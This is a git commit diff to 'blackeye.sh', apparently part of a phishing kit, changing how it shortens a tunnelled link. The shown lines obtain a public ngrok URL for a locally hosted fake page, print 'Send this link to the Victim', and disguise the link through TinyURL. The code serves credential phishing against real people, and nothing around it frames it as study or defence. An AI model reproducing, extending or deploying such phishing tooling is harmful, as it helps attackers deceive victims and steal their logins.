b95e0b7888efb72629a625eddd1d507c963e634c
kcapur <75095928+kcapur@users.noreply.github.com>
2021-06-01 19:59:24 +0200

    Update blackeye.sh

--- blackeye.sh
+++ blackeye.sh
@@ -424,10 +424,9 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 
-short_url=$(curl -s -N "http://tinyurl.com/api-create.php?url=$link" --stderr - | grep -o "http://tinyurl.com/[0-9a-z]*")
+short_url=$(curl -s "http://tinyurl.com/api-create.php?url=$link" --stderr -)
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_url
-echo $short_url
 echo ""
 
 checkfound
